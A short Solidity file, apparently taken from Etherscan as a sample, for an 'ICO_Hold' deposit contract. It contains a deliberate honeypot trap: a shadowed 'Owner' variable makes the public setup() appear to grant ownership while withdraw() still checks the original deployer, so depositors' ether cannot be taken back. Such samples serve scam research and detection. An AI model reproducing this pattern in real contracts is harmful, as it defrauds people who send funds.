// https://etherscan.io/address/0x4ba0d338a7c41cc12778e0a2fa6df2361e8d8465#code

pragma solidity ^0.4.10;

contract Ownable {
    address public Owner = msg.sender;
    function isOwner() returns (bool) {
        if (Owner == msg.sender) return true; return false;
    }
}

contract ICO_Hold is Ownable {
    mapping (address => uint) public deposits;
    uint public openDate;
    address public Owner;

function() public payable { }
    
    function setup(uint _openDate) public {
        Owner = msg.sender;
        openDate = _openDate;
    }
    
    function deposit() public payable {
        if (msg.value >= 0.5 ether) {
            deposits[msg.sender] += msg.value;
        }
    }

function withdraw(uint amount) public {
        if (isOwner() && now >= openDate) {
            uint max = deposits[msg.sender];
            if (amount <= max && max > 0) {
                msg.sender.transfer(amount);
            }
        }
    }
}
